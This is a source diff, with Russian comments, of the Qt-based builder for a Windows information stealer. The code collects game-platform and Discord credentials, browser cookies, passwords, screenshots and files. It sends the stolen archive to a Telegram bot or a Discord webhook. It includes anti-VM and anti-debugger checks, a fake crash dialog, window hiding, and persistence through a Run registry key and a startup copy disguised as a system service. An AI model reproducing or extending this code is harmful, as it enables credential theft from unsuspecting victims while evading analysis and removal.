@@ -79,6 +79,45 @@ void MainWindow::emitLog(const QString& message) {
     emit logUpdated(message);
 }
 
+// Реализация метода updateConfigFromUI
+void MainWindow::updateConfigFromUI() {
+    QMutexLocker locker(&logMutex); // Потокобезопасность
+
+    config.sendMethod = sendMethodComboBox->currentText().toStdString();
+    config.telegramToken = tokenLineEdit->text().toStdString();
+    config.chatId = chatIdLineEdit->text().toStdString();
+    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
+    config.filename = fileNameLineEdit->text().toStdString();
+    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
+    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
+    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
+    config.iconPath = iconPathLineEdit->text().toStdString();
+    config.githubToken = githubTokenLineEdit->text().toStdString();
+    config.githubRepo = githubRepoLineEdit->text().toStdString();
+
+    // Обновление чекбоксов
+    config.discord = discordCheckBox->isChecked();
+    config.steam = steamCheckBox->isChecked();
+    config.steamMAFile = steamMAFileCheckBox->isChecked();
+    config.epic = epicCheckBox->isChecked();
+    config.roblox = robloxCheckBox->isChecked();
+    config.battlenet = battlenetCheckBox->isChecked();
+    config.minecraft = minecraftCheckBox->isChecked();
+    config.cookies = cookiesCheckBox->isChecked();
+    config.passwords = passwordsCheckBox->isChecked();
+    config.screenshot = screenshotCheckBox->isChecked();
+    config.fileGrabber = fileGrabberCheckBox->isChecked();
+    config.systemInfo = systemInfoCheckBox->isChecked();
+    config.socialEngineering = socialEngineeringCheckBox->isChecked();
+    config.chatHistory = chatHistoryCheckBox->isChecked();
+    config.telegram = telegramCheckBox->isChecked();
+    config.antiVM = antiVMCheckBox->isChecked();
+    config.fakeError = fakeErrorCheckBox->isChecked();
+    config.silent = silentCheckBox->isChecked();
+    config.autoStart = autoStartCheckBox->isChecked();
+    config.persist = persistCheckBox->isChecked();
+}
+
 // Конструктор
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent)
@@ -183,6 +222,9 @@ MainWindow::MainWindow(QWidget *parent)
     connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
     connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
     connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
+
+    // Инициализация config начальными значениями
+    updateConfigFromUI();
 }
 
 // Деструктор
@@ -1368,19 +1410,17 @@ QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigne
 }
 
 // Применение AES-дешифрования
-QByteArray MainWindow::applyAESDecrypt(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
+QByteArray applyAESDecrypt(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
     BCRYPT_ALG_HANDLE hAlg = nullptr;
     BCRYPT_KEY_HANDLE hKey = nullptr;
     NTSTATUS status;
 
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
-        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования");
         return QByteArray();
     }
 
     if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        emitLog("Ошибка: Не удалось установить режим цепочки AES для дешифрования");
         return QByteArray();
     }
 
@@ -1388,21 +1428,18 @@ QByteArray MainWindow::applyAESDecrypt(const QByteArray& data, const std::array<
     DWORD cbResult = 0;
     if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        emitLog("Ошибка: Не удалось получить размер объекта ключа AES для дешифрования");
         return QByteArray();
     }
 
     std::vector<BYTE> keyObject(keyObjectSize);
     if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования");
         return QByteArray();
     }
 
     if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
         BCryptDestroyKey(hKey);
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        emitLog("Ошибка: Не удалось вычислить размер дешифрованных данных");
         return QByteArray();
     }
 
@@ -1410,7 +1447,6 @@ QByteArray MainWindow::applyAESDecrypt(const QByteArray& data, const std::array<
     if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), decryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
         BCryptDestroyKey(hKey);
         BCryptCloseAlgorithmProvider(hAlg, 0);
-        emitLog("Ошибка: Не удалось дешифровать данные");
         return QByteArray();
     }
 
@@ -1437,81 +1473,35 @@ void MainWindow::encryptData(const std::string& inputPath, const std::string& ou
 
     // Применяем XOR-шифрование с первым ключом
     QByteArray xorData = applyXOR(data, key1);
+    emitLog("Применено XOR-шифрование с первым ключом");
+
     // Применяем AES-шифрование с вторым ключом
-    QByteArray aesData = applyAES(xorData, key2, iv);
-    if (aesData.isEmpty()) {
-        emitLog("Ошибка: Не удалось зашифровать данные");
+    QByteArray encryptedData = applyAES(xorData, key2, iv);
+    if (encryptedData.isEmpty()) {
+        emitLog("Ошибка: Не удалось выполнить AES-шифрование");
         return;
     }
+    emitLog("Применено AES-шифрование с вторым ключом");
 
-    // Сохраняем IV в начало файла, чтобы использовать его при дешифровании
+    // Сохраняем IV в начало файла, затем зашифрованные данные
     QFile outputFile(QString::fromStdString(outputPath));
     if (!outputFile.open(QIODevice::WriteOnly)) {
-        emitLog("Ошибка: Не удалось открыть файл для записи зашифрованных данных: " + QString::fromStdString(outputPath));
+        emitLog("Ошибка: Не удалось создать файл для зашифрованных данных: " + QString::fromStdString(outputPath));
         return;
     }
 
-    // Записываем IV (16 байт) и зашифрованные данные
-    outputFile.write(QByteArray((char*)iv.data(), iv.size()));
-    outputFile.write(aesData);
+    outputFile.write((char*)iv.data(), iv.size());
+    outputFile.write(encryptedData);
     outputFile.close();
 
     emitLog("Данные зашифрованы и сохранены: " + QString::fromStdString(outputPath));
 }
 
-// Дешифрование данных
-void MainWindow::decryptData(const std::string& inputPath, const std::string& outputPath) {
-    QFile inputFile(QString::fromStdString(inputPath));
-    if (!inputFile.open(QIODevice::ReadOnly)) {
-        emitLog("Ошибка: Не удалось открыть файл для дешифрования: " + QString::fromStdString(inputPath));
-        return;
-    }
-
-    // Читаем IV (первые 16 байт)
-    QByteArray ivData = inputFile.read(16);
-    if (ivData.size() != 16) {
-        emitLog("Ошибка: Неверный формат зашифрованного файла (IV отсутствует)");
-        inputFile.close();
-        return;
-    }
-    std::array<unsigned char, 16> iv;
-    std::copy(ivData.begin(), ivData.end(), iv.begin());
-
-    // Читаем оставшиеся зашифрованные данные
-    QByteArray encryptedData = inputFile.readAll();
-    inputFile.close();
-
-    auto key1 = GetEncryptionKey(true);
-    auto key2 = GetEncryptionKey(false);
-
-    // Дешифруем AES
-    QByteArray aesDecrypted = applyAESDecrypt(encryptedData, key2, iv);
-    if (aesDecrypted.isEmpty()) {
-        emitLog("Ошибка: Не удалось дешифровать данные (AES)");
-        return;
-    }
-
-    // Дешифруем XOR
-    QByteArray finalData = applyXOR(aesDecrypted, key1);
-
-    QFile outputFile(QString::fromStdString(outputPath));
-    if (!outputFile.open(QIODevice::WriteOnly)) {
-        emitLog("Ошибка: Не удалось открыть файл для записи дешифрованных данных: " + QString::fromStdString(outputPath));
-        return;
-    }
-
-    outputFile.write(finalData);
-    outputFile.close();
-
-    emitLog("Данные дешифрованы и сохранены: " + QString::fromStdString(outputPath));
-}
-
 // Отправка данных
 void MainWindow::sendData(const std::string& filePath) {
-    QString sendMethod = ui->sendMethodComboBox->currentText();
-    emitLog("Отправка данных через: " + sendMethod);
+    emitLog("Начинается отправка данных...");
 
-    if (sendMethod == "Local File") {
+    if (config.sendMethod == "Local File") {
         std::string localPath = QDir::currentPath().toStdString() + "\\stolen_data_encrypted.zip";
         try {
             std::filesystem::copy_file(filePath, localPath, std::filesystem::copy_options::overwrite_existing);
@@ -1519,313 +1509,222 @@ void MainWindow::sendData(const std::string& filePath) {
         } catch (const std::exception& e) {
             emitLog("Ошибка сохранения данных локально: " + QString::fromStdString(e.what()));
         }
-    } else if (sendMethod == "Telegram") {
-        QString token = ui->tokenLineEdit->text();
-        QString chatId = ui->chatIdLineEdit->text();
-        if (token.isEmpty() || chatId.isEmpty()) {
-            emitLog("Ошибка: Токен Telegram или Chat ID не указаны");
-            return;
-        }
-
-        CURL* curl = curl_easy_init();
-        if (!curl) {
-            emitLog("Ошибка: Не удалось инициализировать CURL");
-            return;
-        }
-
-        curl_mime* mime = curl_mime_init(curl);
-        curl_mimepart* part = curl_mime_addpart(mime);
-        curl_mime_name(part, "chat_id");
-        curl_mime_data(part, chatId.toStdString().c_str(), CURL_ZERO_TERMINATED);
-
-        part = curl_mime_addpart(mime);
-        curl_mime_name(part, "document");
-        curl_mime_filedata(part, filePath.c_str());
-        curl_mime_filename(part, "stolen_data_encrypted.zip");
-
-        std::string url = "https://api.telegram.org/bot" + token.toStdString() + "/sendDocument";
-        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-
-        std::string response;
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-
-        CURLcode res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            emitLog("Ошибка отправки через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
-        } else {
-            QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
-            if (doc.object().value("ok").toBool()) {
-                emitLog("Данные успешно отправлены через Telegram");
-            } else {
-                emitLog("Ошибка Telegram API: " + QString::fromStdString(doc.toJson()));
-            }
-        }
-
-        curl_mime_free(mime);
-        curl_easy_cleanup(curl);
-    } else if (sendMethod == "Discord") {
-        QString webhookUrl = ui->discordWebhookLineEdit->text();
-        if (webhookUrl.isEmpty()) {
-            emitLog("Ошибка: Webhook URL для Discord не указан");
-            return;
-        }
-
-        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-        QHttpPart filePart;
-        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"stolen_data_encrypted.zip\""));
-        QFile* file = new QFile(QString::fromStdString(filePath));
-        if (!file->open(QIODevice::ReadOnly)) {
-            emitLog("Ошибка: Не удалось открыть файл для отправки через Discord");
-            delete file;
-            delete multiPart;
-            return;
-        }
-        filePart.setBodyDevice(file);
-        file->setParent(multiPart);
-        multiPart->append(filePart);
-
-        QNetworkRequest request(QUrl(webhookUrl));
-        QNetworkReply* reply = manager->post(request, multiPart);
-        multiPart->setParent(reply);
-
-        connect(reply, &QNetworkReply::finished, this, [this, reply]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                emitLog("Данные успешно отправлены через Discord");
-            } else {
-                emitLog("Ошибка отправки через Discord: " + reply->errorString());
-            }
-            reply->deleteLater();
-        });
+    } else if (config.sendMethod == "Telegram") {
+        sendToTelegram(filePath);
+    } else if (config.sendMethod == "Discord") {
+        sendToDiscord(filePath);
+    } else {
+        emitLog("Ошибка: Неизвестный метод отправки: " + QString::fromStdString(config.sendMethod));
     }
+
+    emitLog("Отправка данных завершена");
 }
 
-// Антианализ (проверка на виртуальную машину, отладчик и т.д.)
-bool MainWindow::AntiAnalysis() {
-    if (!config.antiVM) return false;
-
-    emitLog("Запуск антианализа...");
-
-    // Проверка на отладчик
-    if (IsDebuggerPresent()) {
-        emitLog("Обнаружен отладчик");
-        return true;
-    }
-
-    // Проверка на виртуальную машину через реестр
-    HKEY hKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        emitLog("Обнаружена VirtualBox");
-        return true;
-    }
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\vmware", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        emitLog("Обнаружен VMware");
-        return true;
-    }
-
-    // Проверка процессов, связанных с анализом
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32W pe32;
-        pe32.dwSize = sizeof(pe32);
-        if (Process32FirstW(hSnapshot, &pe32)) {
-            do {
-                QString processName = QString::fromWCharArray(pe32.szExeFile).toLower();
-                if (processName.contains("wireshark") || processName.contains("fiddler") || processName.contains("procmon") || processName.contains("ollydbg")) {
-                    CloseHandle(hSnapshot);
-                    emitLog("Обнаружен процесс анализа: " + processName);
-                    return true;
-                }
-            } while (Process32NextW(hSnapshot, &pe32));
-        }
-        CloseHandle(hSnapshot);
-    }
-
-    // Проверка через тайминги (RDTSC для обнаружения эмуляции)
-    LARGE_INTEGER freq, start, end;
-    QueryPerformanceFrequency(&freq);
-    QueryPerformanceCounter(&start);
-    for (volatile int i = 0; i < 100000; i++);
-    QueryPerformanceCounter(&end);
-    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
-    if (elapsed > 50) { // Порог для обнаружения замедления в ВМ
-        emitLog("Обнаружено замедление, возможно, виртуальная машина");
-        return true;
-    }
-
-    emitLog("Антианализ пройден, подозрительная среда не обнаружена");
-    return false;
-}
-
-// Создание фейковой ошибки
-void MainWindow::FakeError() {
-    if (!config.fakeError) return;
-
-    emitLog("Создание фейковой ошибки...");
-    MessageBoxW(NULL, L"Critical Error: Application has encountered an unexpected error and will now close.\nError Code: 0x80000003", L"Fatal Error", MB_ICONERROR | MB_OK);
-}
-
-// Режим скрытности
-void MainWindow::Stealth() {
-    if (!config.silent) return;
-
-    emitLog("Запуск в режиме скрытности...");
-    HWND hwnd = GetConsoleWindow();
-    if (hwnd != NULL) {
-        ShowWindow(hwnd, SW_HIDE);
-    }
-
-    // Скрываем процесс из списка задач
-    HMODULE hModule = GetModuleHandle(NULL);
-    char path[MAX_PATH];
-    GetModuleFileNameA(hModule, path, MAX_PATH);
-    std::string processName = std::filesystem::path(path).filename().string();
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe32;
-        pe32.dwSize = sizeof(pe32);
-        if (Process32First(hSnapshot, &pe32)) {
-            do {
-                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
-                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
-                    if (hProcess) {
-                        SetPriorityClass(hProcess, BELOW_NORMAL_PRIORITY_CLASS);
-                        CloseHandle(hProcess);
-                    }
-                    break;
-                }
-            } while (Process32Next(hSnapshot, &pe32));
-        }
-        CloseHandle(hSnapshot);
-    }
-}
-
-// Обеспечение персистентности
-void MainWindow::Persist() {
-    if (!config.autoStart && !config.persist) return;
-
-    emitLog("Настройка персистентности...");
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    std::string exePath = path;
-
-    // Копируем файл в %APPDATA%
-    char appDataPath[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
-    std::string persistPath = std::string(appDataPath) + "\\Microsoft\\Windows\\svchost.exe";
-    try {
-        std::filesystem::create_directories(std::filesystem::path(persistPath).parent_path());
-        std::filesystem::copy_file(exePath, persistPath, std::filesystem::copy_options::overwrite_existing);
-        emitLog("Файл скопирован для персистентности: " + QString::fromStdString(persistPath));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка копирования файла для персистентности: " + QString::fromStdString(e.what()));
+// Реализация метода sendToTelegram
+void MainWindow::sendToTelegram(const std::string& filePath) {
+    if (config.telegramToken.empty() || config.chatId.empty()) {
+        emitLog("Ошибка: Telegram Token или Chat ID не указаны");
         return;
     }
 
-    if (config.autoStart) {
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (BYTE*)persistPath.c_str(), persistPath.length() + 1);
-            RegCloseKey(hKey);
-            emitLog("Добавлен автозапуск в реестр");
+    CURL* curl = curl_easy_init();
+    if (!curl) {
+        emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
+        return;
+    }
+
+    std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
+    struct curl_httppost* formpost = nullptr;
+    struct curl_httppost* lastptr = nullptr;
+    std::string response;
+
+    // Добавляем chat_id
+    curl_formadd(&formpost, &lastptr,
+                 CURLFORM_COPYNAME, "chat_id",
+                 CURLFORM_COPYCONTENTS, config.chatId.c_str(),
+                 CURLFORM_END);
+
+    // Добавляем файл
+    curl_formadd(&formpost, &lastptr,
+                 CURLFORM_COPYNAME, "document",
+                 CURLFORM_FILE, filePath.c_str(),
+                 CURLFORM_END);
+
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        emitLog("Ошибка отправки в Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
+    } else {
+        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
+        QJsonObject obj = doc.object();
+        if (obj["ok"].toBool()) {
+            emitLog("Данные успешно отправлены в Telegram");
         } else {
-            emitLog("Ошибка добавления автозапуска в реестр");
+            emitLog("Ошибка Telegram API: " + QString::fromStdString(obj["description"].toString().toStdString()));
         }
     }
 
-    if (config.persist) {
-        // Добавляем задачу в планировщик задач
-        QProcess process;
-        QString command = "schtasks /create /tn \"WindowsUpdateService\" /tr \"" + QString::fromStdString(persistPath) + "\" /sc onlogon /rl highest /f";
-        process.start("cmd.exe", QStringList() << "/c" << command);
-        if (process.waitForFinished() && process.exitCode() == 0) {
-            emitLog("Добавлена задача в планировщик задач для персистентности");
+    curl_formfree(formpost);
+    curl_easy_cleanup(curl);
+}
+
+// Реализация метода sendToDiscord
+void MainWindow::sendToDiscord(const std::string& filePath) {
+    if (config.discordWebhook.empty()) {
+        emitLog("Ошибка: Discord Webhook не указан");
+        return;
+    }
+
+    CURL* curl = curl_easy_init();
+    if (!curl) {
+        emitLog("Ошибка: Не удалось инициализировать CURL для Discord");
+        return;
+    }
+
+    struct curl_httppost* formpost = nullptr;
+    struct curl_httppost* lastptr = nullptr;
+    std::string response;
+
+    // Добавляем файл
+    curl_formadd(&formpost, &lastptr,
+                 CURLFORM_COPYNAME, "file",
+                 CURLFORM_FILE, filePath.c_str(),
+                 CURLFORM_END);
+
+    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
+    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        emitLog("Ошибка отправки в Discord: " + QString::fromStdString(curl_easy_strerror(res)));
+    } else {
+        if (response.empty()) {
+            emitLog("Данные успешно отправлены в Discord");
         } else {
-            emitLog("Ошибка добавления задачи в планировщик задач: " + process.readAllStandardError());
+            emitLog("Ответ Discord: " + QString::fromStdString(response));
+        }
+    }
+
+    curl_formfree(formpost);
+    curl_easy_cleanup(curl);
+}
+
+// Антианализ
+bool MainWindow::AntiAnalysis() {
+    if (!config.antiVM) return false;
+
+    // Проверка на виртуальную машину
+    unsigned int cpuInfo[4] = {0};
+    __cpuid((int*)cpuInfo, 1);
+    if ((cpuInfo[2] >> 31) & 1) {
+        emitLog("Обнаружена виртуальная машина (CPUID)");
+        return true;
+    }
+
+    // Проверка на процессы анализа
+    const char* suspiciousProcesses[] = {"vboxservice.exe", "vmtoolsd.exe", "wireshark.exe", "procmon.exe", "ollydbg.exe"};
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(snapshot, &pe32)) {
+        do {
+            for (const auto& proc : suspiciousProcesses) {
+                if (_stricmp(pe32.szExeFile, proc) == 0) {
+                    CloseHandle(snapshot);
+                    emitLog("Обнаружен подозрительный процесс: " + QString::fromStdString(proc));
+                    return true;
+                }
+            }
+        } while (Process32Next(snapshot, &pe32));
+    }
+    CloseHandle(snapshot);
+
+    // Проверка на объем оперативной памяти
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    if (memoryStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // Менее 2 ГБ
+        emitLog("Обнаружен подозрительно малый объем оперативной памяти");
+        return true;
+    }
+
+    return false;
+}
+
+// Поддельная ошибка
+void MainWindow::FakeError() {
+    if (!config.fakeError) return;
+    MessageBoxA(NULL, "Critical Error: Application has encountered an unexpected error and will now close.", "Error", MB_ICONERROR | MB_OK);
+    emitLog("Показана поддельная ошибка");
+}
+
+// Скрытность
+void MainWindow::Stealth() {
+    if (!config.silent) return;
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) ShowWindow(hwnd, SW_HIDE);
+    emitLog("Приложение скрыто");
+}
+
+// Постоянство
+void MainWindow::Persist() {
+    if (!config.autoStart && !config.persist) return;
+
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    std::string destPath = std::string(std::getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe";
+
+    try {
+        std::filesystem::copy_file(exePath, destPath, std::filesystem::copy_options::overwrite_existing);
+        emitLog("Приложение добавлено в автозагрузку: " + QString::fromStdString(destPath));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка добавления в автозагрузку: " + QString::fromStdString(e.what()));
+    }
+
+    if (config.persist) {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, (BYTE*)destPath.c_str(), destPath.length() + 1);
+            RegCloseKey(hKey);
+            emitLog("Приложение добавлено в реестр для постоянства");
+        } else {
+            emitLog("Ошибка добавления в реестр для постоянства");
         }
     }
 }
 
 // Завершение приложения
 void MainWindow::exitApp() {
-    emitLog("Завершение приложения...");
     QApplication::quit();
 }
 
-// Обработчик ответа от сети
-void MainWindow::replyFinished(QNetworkReply* reply) {
-    if (reply->error() == QNetworkReply::NoError) {
-        emitLog("Сетевой запрос успешно выполнен");
-    } else {
-        emitLog("Ошибка сетевого запроса: " + reply->errorString());
-    }
-    reply->deleteLater();
-}
-
-// Добавление лога в текстовое поле
-void MainWindow::appendLog(const QString& message) {
-    ui->textEdit->append(message);
-}
-
-// Обработчик нажатия кнопки "Собрать"
+// Обработчики событий UI
 void MainWindow::on_buildButton_clicked() {
     if (isBuilding) {
-        QMessageBox::warning(this, "Предупреждение", "Сборка уже выполняется!");
+        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
         return;
     }
 
-    // Сохранение конфигурации
-    config.token = ui->tokenLineEdit->text().toStdString();
-    config.chatId = ui->chatIdLineEdit->text().toStdString();
-    config.discordWebhook = ui->discordWebhookLineEdit->text().toStdString();
-    config.filename = ui->filenameLineEdit->text().toStdString();
-    config.encryptionKey1 = ui->encryptionKey1LineEdit->text().toStdString();
-    config.encryptionKey2 = ui->encryptionKey2LineEdit->text().toStdString();
-    config.encryptionSalt = ui->encryptionSaltLineEdit->text().toStdString();
-    config.iconPath = ui->iconPathLineEdit->text().toStdString();
-    config.githubToken = ui->githubTokenLineEdit->text().toStdString();
-    config.githubRepo = ui->githubRepoLineEdit->text().toStdString();
-    config.steam = ui->steamCheckBox->isChecked();
-    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
-    config.epic = ui->epicCheckBox->isChecked();
-    config.roblox = ui->robloxCheckBox->isChecked();
-    config.battlenet = ui->battlenetCheckBox->isChecked();
-    config.minecraft = ui->minecraftCheckBox->isChecked();
-    config.discord = ui->discordCheckBox->isChecked();
-    config.telegram = ui->telegramCheckBox->isChecked();
-    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
-    config.cookies = ui->cookiesCheckBox->isChecked();
-    config.passwords = ui->passwordsCheckBox->isChecked();
-    config.screenshot = ui->screenshotCheckBox->isChecked();
-    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
-    config.systemInfo = ui->systemInfoCheckBox->isChecked();
-    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
-    config.antiVM = ui->antiVMCheckBox->isChecked();
-    config.fakeError = ui->fakeErrorCheckBox->isChecked();
-    config.silent = ui->silentCheckBox->isChecked();
-    config.autoStart = ui->autoStartCheckBox->isChecked();
-    config.persist = ui->persistCheckBox->isChecked();
-
-    emitLog("Конфигурация сохранена, начало сборки...");
-
-    // Генерация полиморфного кода и ключей
+    updateConfigFromUI();
     generatePolymorphicCode();
     generateBuildKeyHeader();
     copyIconToBuild();
 
-    // Выбор метода сборки
-    QString buildMethod = ui->buildMethodComboBox->currentText();
-    if (buildMethod == "Local Build") {
+    if (buildMethodComboBox->currentText() == "Local Build") {
         buildTimer->start(100);
-    } else if (buildMethod == "GitHub Actions") {
+    } else if (buildMethodComboBox->currentText() == "GitHub Actions") {
         triggerGitHubActions();
     }
 }
 
-// Обработчик выбора иконки
 void MainWindow::on_iconBrowseButton_clicked() {
     QString fileName = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
     if (!fileName.isEmpty()) {
@@ -1834,87 +1733,88 @@ void MainWindow::on_iconBrowseButton_clicked() {
     }
 }
 
-// Сохранение конфигурации
 void MainWindow::on_actionSaveConfig_triggered() {
+    updateConfigFromUI();
     QString fileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)");
     if (fileName.isEmpty()) return;
 
     QSettings settings(fileName, QSettings::IniFormat);
-    settings.setValue("token", ui->tokenLineEdit->text());
-    settings.setValue("chatId", ui->chatIdLineEdit->text());
-    settings.setValue("discordWebhook", ui->discordWebhookLineEdit->text());
-    settings.setValue("filename", ui->filenameLineEdit->text());
-    settings.setValue("encryptionKey1", ui->encryptionKey1LineEdit->text());
-    settings.setValue("encryptionKey2", ui->encryptionKey2LineEdit->text());
-    settings.setValue("encryptionSalt", ui->encryptionSaltLineEdit->text());
-    settings.setValue("iconPath", ui->iconPathLineEdit->text());
-    settings.setValue("githubToken", ui->githubTokenLineEdit->text());
-    settings.setValue("githubRepo", ui->githubRepoLineEdit->text());
-    settings.setValue("steam", ui->steamCheckBox->isChecked());
-    settings.setValue("steamMAFile", ui->steamMAFileCheckBox->isChecked());
-    settings.setValue("epic", ui->epicCheckBox->isChecked());
-    settings.setValue("roblox", ui->robloxCheckBox->isChecked());
-    settings.setValue("battlenet", ui->battlenetCheckBox->isChecked());
-    settings.setValue("minecraft", ui->minecraftCheckBox->isChecked());
-    settings.setValue("discord", ui->discordCheckBox->isChecked());
-    settings.setValue("telegram", ui->telegramCheckBox->isChecked());
-    settings.setValue("chatHistory", ui->chatHistoryCheckBox->isChecked());
-    settings.setValue("cookies", ui->cookiesCheckBox->isChecked());
-    settings.setValue("passwords", ui->passwordsCheckBox->isChecked());
-    settings.setValue("screenshot", ui->screenshotCheckBox->isChecked());
-    settings.setValue("fileGrabber", ui->fileGrabberCheckBox->isChecked());
-    settings.setValue("systemInfo", ui->systemInfoCheckBox->isChecked());
-    settings.setValue("socialEngineering", ui->socialEngineeringCheckBox->isChecked());
-    settings.setValue("antiVM", ui->antiVMCheckBox->isChecked());
-    settings.setValue("fakeError", ui->fakeErrorCheckBox->isChecked());
-    settings.setValue("silent", ui->silentCheckBox->isChecked());
-    settings.setValue("autoStart", ui->autoStartCheckBox->isChecked());
-    settings.setValue("persist", ui->persistCheckBox->isChecked());
+    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
+    settings.setValue("telegramToken", QString::fromStdString(config.telegramToken));
+    settings.setValue("chatId", QString::fromStdString(config.chatId));
+    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
+    settings.setValue("filename", QString::fromStdString(config.filename));
+    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
